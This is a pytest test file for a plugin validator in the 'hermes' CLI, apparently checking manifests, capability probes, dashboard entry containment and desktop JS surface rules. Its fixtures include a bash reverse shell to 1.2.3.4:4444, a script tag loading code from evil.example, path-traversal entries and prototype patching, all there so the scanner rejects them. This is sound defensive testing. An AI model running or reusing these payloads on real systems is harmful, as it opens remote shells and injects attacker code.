"""Tests for ``hermes plugins validate`` (hermes_cli/plugin_validate.py).

Static manifest checks + subprocess-isolated capability probing against a
recording stub context.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml

from hermes_cli.plugin_validate import validate_plugin_dir
from hermes_cli.plugin_validate_desktop import desktop_surface_hits, is_desktop_surface


def _make_plugin(
    tmp_path: Path,
    *,
    manifest: dict,
    init_py: str | None = "def register(ctx):\n    pass\n",
) -> Path:
    d = tmp_path / manifest.get("name", "fixture-plugin")
    d.mkdir(parents=True, exist_ok=True)
    (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8")
    if init_py is not None:
        (d / "__init__.py").write_text(init_py, encoding="utf-8")
    return d


BASE_MANIFEST = {
    "name": "fixture-plugin",
    "version": "1.0.0",
    "description": "A fixture plugin.",
}


def test_requires_hermes_spec_is_validated(tmp_path):
    manifest = dict(BASE_MANIFEST, requires_hermes=">=0.21")
    d = _make_plugin(tmp_path, manifest=manifest)

    report = validate_plugin_dir(d)

    assert report.ok, report.failures
    assert ("requires_hermes", True, "spec '>=0.21' parses") in report.checks


def test_admission_runs_the_install_scanner(tmp_path):
    """Admission and install must agree: a tree the installer would hard-block (dangerous) fails
    validation; caution findings are surfaced to the reviewer as warnings without failing."""
    caution = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="caution-plugin"))
    (caution / "helper.py").write_text("eval('1 + 1')\n", encoding="utf-8")
    report = validate_plugin_dir(caution)
    assert report.ok, report.failures
    assert ("security scan", True, "caution") in report.checks
    assert any(w.startswith("security scan caution:") for w in report.warnings)

    dangerous = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST, name="dangerous-plugin"))
    (dangerous / "setup.sh").write_text("/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
    report = validate_plugin_dir(dangerous)
    assert not report.ok
    assert any(name == "security scan" and not ok for name, ok, _ in report.checks)


class TestCapabilityProbe:
    def test_undeclared_tool_registration_fails_with_diff(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "sneaky_tool" in joined
        assert "undeclared" in joined.lower()

    def test_declared_and_registered_passes(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["good_tool"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('good_tool', 'good', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert report.ok

    def test_declared_but_not_registered_warns(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["phantom_tool"])
        d = _make_plugin(tmp_path, manifest=manifest)
        report = validate_plugin_dir(d)
        assert report.ok  # warn, not fail
        assert any("phantom_tool" in w for w in report.warnings)

    def test_undeclared_hook_registration_fails(self, tmp_path):
        init = (
            "def register(ctx):\n"
            "    ctx.register_hook('pre_tool_call', lambda **kw: None)\n"
        )
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("pre_tool_call" in f for f in report.failures)

    def test_crashing_register_is_contained(self, tmp_path):
        init = "def register(ctx):\n    raise RuntimeError('boom')\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)  # must not raise / kill the CLI
        assert not report.ok
        assert any("boom" in f or "register()" in f for f in report.failures)

    def test_import_time_os_exit_is_contained(self, tmp_path):
        init = "import os\nos._exit(7)\n"
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok

    def test_builtin_tool_collision_fails(self, tmp_path):
        manifest = dict(BASE_MANIFEST, provides_tools=["terminal"])
        init = (
            "def register(ctx):\n"
            "    ctx.register_tool('terminal', 'shadow', {}, lambda a: '')\n"
        )
        d = _make_plugin(tmp_path, manifest=manifest, init_py=init)
        report = validate_plugin_dir(d)
        assert not report.ok
        joined = " ".join(report.failures)
        assert "terminal" in joined
        assert "built-in" in joined

    def test_probe_context_returns_get_config_defaults(self, tmp_path):
        """Real PluginContext.get_config yields the default when nothing is configured; the probe must
        too, or every plugin doing ``int(ctx.get_config("timeout", 180))`` fails admission."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    int(ctx.get_config('timeout_seconds', 180))\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures


    def test_probe_context_has_real_context_attribute_surface(self, tmp_path):
        """An attribute the real PluginContext lacks must raise AttributeError in the probe too:
        handing back a callable made ``getattr(ctx, "profile_path", None)`` truthy and crashed
        register() only under validation."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_tools": ["t"]},
            init_py=(
                "def register(ctx):\n"
                "    assert getattr(ctx, 'profile_path', None) is None\n"
                "    ctx.register_platform('probe', object)\n"
                "    ctx.register_tool('t', schema={}, handler=lambda **kw: None)\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures

    def test_probe_state_is_ephemeral_json_storage(self, tmp_path):
        """Registration can retain ctx.state and read/write JSON without durable storage."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "provides_hooks": ["on_session_start"]},
            init_py=(
                "import os\n"
                "from pathlib import Path\n"
                "def register(ctx):\n"
                "    state = ctx.state\n"
                "    assert state is ctx.state\n"
                "    assert state.get('wake') is None\n"
                "    default = {'hash': '', 'delivered_at': 0}\n"
                "    assert state.get('wake', default=default) is default\n"
                "    value = {'hash': 'probe', 'delivered_at': 1, 'items': [1]}\n"
                "    assert state.set('wake', value) is None\n"
                "    value['items'].append(2)\n"
                "    loaded = state.get('wake')\n"
                "    assert loaded == {'hash': 'probe', 'delivered_at': 1, 'items': [1]}\n"
                "    loaded['items'].append(3)\n"
                "    assert state.get('wake')['items'] == [1]\n"
                "    assert not (Path(os.environ['HERMES_HOME']) / 'plugin-data').exists()\n"
                "    ctx.register_hook('on_session_start', lambda **kw: None)\n"
            ),
        )
        for _ in range(2):
            report = validate_plugin_dir(d)
            assert report.ok, report.failures

    @pytest.mark.parametrize(("operation", "failure"), [
        ("ctx.unknown_api()", "unknown_api"),
        ("ctx.state.clear()", "clear"),
        ("ctx.register_tool('sneaky_tool', 'sneaky', {}, lambda a: '')", "undeclared tools"),
        ("ctx.register_hook('pre_tool_call', lambda **kw: None)", "undeclared hooks"),
        ("ctx.register_middleware('pre_llm_call', lambda **kw: None)", "undeclared middleware"),
    ])
    def test_probe_state_preserves_admission_failures(self, tmp_path, operation, failure):
        d = _make_plugin(
            tmp_path,
            manifest=dict(BASE_MANIFEST),
            init_py=(
                "def register(ctx):\n"
                "    ctx.state.set('wake', {'hash': 'probe'})\n"
                f"    {operation}\n"
            ),
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any(failure in detail for detail in report.failures), report.failures


class TestDashboardLoadability:
    @pytest.mark.parametrize(("manifest", "entry"), [
        ({"entry": "plugin.js"}, "plugin.js"),
        ({}, "dist/index.js"),
    ])
    @pytest.mark.parametrize("dangerous", [False, True])
    def test_dashboard_entry_is_loadable_and_scanned(self, tmp_path, manifest, entry, dangerous):
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=None)
        dashboard = d / "dashboard"
        target = dashboard / entry
        target.parent.mkdir(parents=True)
        target.write_text("// synthetic dashboard bundle\n", encoding="utf-8")
        (dashboard / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
        if dangerous:
            (dashboard / "setup.sh").write_text(
                "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8",
            )

        report = validate_plugin_dir(d)

        assert ("loadable", True, f"entry: dashboard/{entry}") in report.checks
        assert report.ok is not dangerous, report.failures
        assert any(name == "security scan" and ok is not dangerous for name, ok, _ in report.checks)

    @pytest.mark.parametrize("manifest", [
        None, "{", "[]", "null", '{"entry": null}', '{"entry": 3}',
        '{"entry": ""}', '{}', '{"entry": "missing.js"}',
        '{"entry": "dist"}', '{"entry": "../outside.js"}',
        '{"entry": "dist/../plugin.js"}', '{"entry": "/outside.js"}',
        '{"entry": "C:/outside.js"}', '{"entry": "C:outside.js"}',
        json.dumps({"entry": "..\\outside.js"}),
        json.dumps({"entry": "\\\\server\\share\\outside.js"}),
    ])
    def test_dashboard_requires_valid_manifest_and_contained_file(self, tmp_path, manifest):
        d = _make_plugin(tmp_path, manifest=dict(BASE_MANIFEST), init_py=None)
        dashboard = d / "dashboard"
        (dashboard / "dist").mkdir(parents=True)
        (dashboard / "plugin.js").write_text("// fixture\n", encoding="utf-8")
        (d / "outside.js").write_text("// fixture\n", encoding="utf-8")
        if manifest is not None:
            (dashboard / "manifest.json").write_text(manifest, encoding="utf-8")

        report = validate_plugin_dir(d)

        assert not report.ok
        assert any(name == "loadable" and not ok for name, ok, _ in report.checks)
        assert any(name == "security scan" for name, _, _ in report.checks)


class TestModelProviderKind:
    def test_import_time_register_provider_is_the_entry_point(self, tmp_path):
        """``kind: model-provider`` plugins register at import via providers.register_provider and
        are never handed a register(ctx); validate must accept that contract, not demand register()."""
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "probe-provider", "kind": "model-provider"},
            init_py=(
                "from providers import register_provider\n"
                "from providers.base import ProviderProfile\n"
                "register_provider(ProviderProfile(name='probe_provider_fixture'))\n"),
        )
        report = validate_plugin_dir(d)
        assert report.ok, report.failures
        assert any(
            name == "capability probe" and "probe_provider_fixture" in detail
            for name, _ok, detail in report.checks
        ), report.checks

    def test_provider_plugin_that_registers_nothing_fails(self, tmp_path):
        d = _make_plugin(
            tmp_path,
            manifest={**BASE_MANIFEST, "name": "empty-provider", "kind": "model-provider"},
            init_py="import providers\n",
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any("registered no ProviderProfile" in f for f in report.failures), report.failures


class TestRequiresHermesSpec:
    """A typo'd ``requires_hermes`` clause must fail admission, not silently gate nothing."""

    def test_typoed_clause_fails_admission(self, tmp_path):
        d = _make_plugin(
            tmp_path, manifest={**BASE_MANIFEST, "requires_hermes": ">=0.21.1,<0.x"}
        )
        report = validate_plugin_dir(d)
        assert not report.ok
        assert any(
            "requires_hermes" in f and "does not parse" in f for f in report.failures
        ), report.failures
class TestDesktopSurface:
    """Catalog-listed desktop plugins must stay inside the SDK surface: the renderer loader gives
    plugin.js full app authority, so prototype patching / app-chunk imports are refused at admission."""

    def _desktop_plugin(self, tmp_path, js: str) -> Path:
        d = tmp_path / "desk"
        (d / "desktop").mkdir(parents=True)
        (d / "plugin.yaml").write_text(yaml.safe_dump(dict(BASE_MANIFEST, name="desk")), encoding="utf-8")
        (d / "desktop" / "plugin.js").write_text(js, encoding="utf-8")
        return d

    def test_sdk_only_plugin_passes(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "import { definePlugin } from '@hermes/plugin-sdk'\n"
            "// Storage.prototype.setItem = noop  (comments are not code)\n"
            "export default definePlugin({ id: 'desk', register(ctx) { ctx.storage.set('k', 1) } })\n"
        ))
        report = validate_plugin_dir(d)
        assert ("desktop surface", True, "stays inside the plugin SDK surface") in report.checks

    def test_script_regex_literal_is_not_injection_but_string_is(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "const clean = html.replace(/<script[\\s\\S]*?<\\/script>/gi, '').replace(/<style[\\s\\S]*?<\\/style>/gi, '')\n"
            "const ratio = total / count / 2\n"
            "el.innerHTML = '<script src=\"https://evil.example/x.js\"></script>'\n"
            "const tag = document.createElement('script')\n"
        ))
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "desktop surface" in failed
        assert ":1)" not in failed["desktop surface"]
        assert "script injection (desktop/plugin.js:3)" in failed["desktop surface"]
        assert "script injection (desktop/plugin.js:4)" in failed["desktop surface"]

    def test_prototype_patch_and_chunk_import_fail(self, tmp_path):
        d = self._desktop_plugin(tmp_path, (
            "const raw = Storage.prototype.setItem\n"
            "Storage.prototype.setItem = function (k, v) { return raw.call(this, k, v) }\n"
            "const mod = await import(/* @vite-ignore */ new URL('./chunk.js', base).href)\n"
            "const sdk = await import('@hermes/plugin-sdk')\n"
        ))
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "desktop surface" in failed
        assert "prototype patching (desktop/plugin.js:2)" in failed["desktop surface"]
        assert "dynamic import outside the SDK (desktop/plugin.js:3)" in failed["desktop surface"]
        assert ":4)" not in failed["desktop surface"]

    def test_node_sidecar_and_test_mjs_outside_desktop_are_not_the_surface(self, tmp_path):
        """A tools plugin with a Node sidecar (``sidecar/*.mjs`` lazily importing a lockfile-pinned
        dependency) and ``tests/*.test.mjs`` has no Desktop surface: the lint stays silent, and the
        scoped helper batch tooling should use reports nothing for it."""
        d = tmp_path / "sidecar-plugin"
        (d / "sidecar").mkdir(parents=True)
        (d / "tests").mkdir()
        (d / "plugin.yaml").write_text(yaml.safe_dump(dict(BASE_MANIFEST, name="sidecar-plugin")), encoding="utf-8")
        (d / "__init__.py").write_text("def register(ctx):\n    pass\n", encoding="utf-8")
        (d / "sidecar" / "cloud-service.mjs").write_text(
            "export async function zip() { const { default: JSZip } = await import('jszip'); return new JSZip() }\n",
            encoding="utf-8")
        (d / "tests" / "cloud-sidecar.test.mjs").write_text("const fn = new Function('return 1')\n", encoding="utf-8")
        report = validate_plugin_dir(d)
        assert "desktop surface" not in {name for name, _ok, _detail in report.checks}
        assert desktop_surface_hits(d) == []
        assert not is_desktop_surface("sidecar/cloud-service.mjs") and not is_desktop_surface("tests/x.test.mjs")

    def test_same_dynamic_import_in_desktop_plugin_js_still_fails(self, tmp_path):
        d = self._desktop_plugin(tmp_path, "const { default: JSZip } = await import('jszip')\n")
        report = validate_plugin_dir(d)
        failed = {name: detail for name, ok, detail in report.checks if not ok}
        assert "dynamic import outside the SDK (desktop/plugin.js:1)" in failed["desktop surface"]
        assert desktop_surface_hits(d) == ["dynamic import outside the SDK (desktop/plugin.js:1)"]
        assert is_desktop_surface("desktop/plugin.js")
